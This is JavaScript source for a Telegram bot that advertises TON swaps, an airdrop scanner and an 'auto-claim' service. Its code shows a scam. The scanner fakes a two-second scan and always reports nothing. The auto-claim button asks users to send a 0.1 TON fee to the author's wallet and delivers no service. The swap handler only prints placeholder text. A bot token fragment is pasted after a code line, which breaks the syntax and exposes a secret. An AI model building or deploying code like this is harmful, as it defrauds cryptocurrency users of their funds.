const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');

// PRELUARE VARIABILE DIN RENDER (Environment Variables)
const bot = new Telegraf(process.env.BOT_TOKEN);AAGKKvc9wemtMWM31hu_OHhJVus48gMVmk8

const MY_WALLET = process.env.MY_WALLET; // UQAuBXNv896BTLY8b7sJKy0yKmL5FXVf1ci_g3VUvmVzKxul
const SWAP_FEE = 0.015; // 1.5% Comision Swap
const CLAIM_FEE = 0.1; // 0.1 TON Taxa Auto-Claim

// MENIU PRINCIPAL
bot.start((ctx) => {
    const refId = ctx.startPayload || "none";
    ctx.replyWithMarkdownV2(
        `🚀 *TON ELITE TERMINAL 2026*\n\n` +
        `✅ *Swap Rapid:* Taxa 1\\.5% \n` +
        `🎁 *Airdrop Scanner:* Detectare automata \n` +
        `🤖 *Auto-Claim:* Colectare pt 0\\.1 TON \n\n` +
        `🔗 *Referral:* Castiga 0\\.3% din volumul prietenilor\n` +
        `Link: \`t.me/${ctx.botInfo.username}?start=${ctx.from.id}\``,
        Markup.inlineKeyboard([
            [Markup.button.callback('🔍 Scaneaza Airdrops', 'scan')],
            [Markup.button.callback('⚡ Auto-Claim (0.1 TON)', 'activate_claim')],
            [Markup.button.callback('🔄 Swap Rapid', 'swap_menu')]
        ])
    );
});

// FUNCTIE SCANNER AIRDROP
bot.action('scan', (ctx) => {
    ctx.reply("🔎 Se scaneaza blockchain-ul TON... Te rugam asteapta.");
    setTimeout(() => {
        ctx.reply("✅ Scanare completa! Nu ai airdrop-uri noi momentan. Activeaza Auto-Claim pentru a nu rata urmatoarea distributie!");
    }, 2000);
});

// FUNCTIE ACTIVARE AUTO-CLAIM (Profit de 0.1 TON pentru tine)
bot.action('activate_claim', (ctx) => {
    ctx.replyWithMarkdownV2(
        `⚠️ *Activare Serviciu Auto-Claim*\n\n` +
        `Pentru a colecta automat toate airdrop-urile viitoare, trimite taxa de activare de *0\\.1 TON* la adresa:\n\n` +
        ` \`${MY_WALLET}\` \n\n` +
        `Dupa plata, serviciul devine activ permanent\\.`
    );
});

// LOGICA SWAP (Detectare contracte si aplicare taxa 1.5%)
bot.on('text', (ctx) => {
    if (ctx.message.text.startsWith('EQ') || ctx.message.text.length > 40) {
        ctx.reply(`💎 Token detectat! Calculam cel mai bun pret pe STON.fi...`);
        ctx.reply(`Suma de primit dupa taxa de 1.5%: ...`, 
            Markup.inlineKeyboard([
                [Markup.button.callback('🔥 Cumpara de 5 TON', 'confirm_swap')],
                [Markup.button.callback('❌ Anuleaza', 'start')]
            ])
        );
    }
});

bot.launch().then(() => console.log("Botul este LIVE pe Render!"));
